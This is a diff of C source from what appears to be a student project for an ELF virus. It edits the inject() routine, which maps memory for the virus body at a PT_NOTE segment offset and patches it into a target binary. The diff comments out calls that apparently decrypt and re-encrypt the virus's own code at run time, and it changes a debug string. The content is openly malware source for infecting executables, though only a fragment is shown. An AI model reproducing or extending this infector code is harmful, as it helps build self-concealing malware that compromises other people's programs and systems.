@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:20:42 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/09 14:47:07 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/10 20:09:17 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -19,19 +19,19 @@
 void		inject(t_data *data)
 {
 #ifdef DEBUG
-	char de[] = "inject\t0\n";
-	data->context == true ?	de[7] = 49 : 0;
+	char de[] = "inject\t\t0\n";
+	data->context == true ?	de[8] = 49 : 0;
 	_log(de, _strlen(de));
 #endif
 
-	revert_one(&data->key, (char*)infect, (size_t)inject - (size_t)infect);
+	/* revert_two(&data->key, (char*)infect, (size_t)inject - (size_t)infect); */
 
 	if (data->context == false || data->context != true)
 		goto next;
 	data->context = false;
 
-	int				size = data->virus.size + data->virus.note->p_offset;
-	uint8_t			*map = _mmap(0, size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
+	int		size = data->virus.size + data->virus.note->p_offset;
+	uint8_t	*map = _mmap(0, size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
 	if (map == MAP_FAILED)
 		goto next;
 
@@ -106,7 +106,7 @@ void		inject(t_data *data)
 	data->context = true;
 
 next:
-	update_one(&data->key, (char*)inject, (size_t)patch - (size_t)inject);
-	revert_one(&data->key, (char*)patch, (size_t)release - (size_t)patch);
+	/* update_two(&data->key, (char*)inject, (size_t)patch - (size_t)inject); */
+	/* revert_two(&data->key, (char*)patch, (size_t)release - (size_t)patch); */
 	patch(data, map, size);
 }
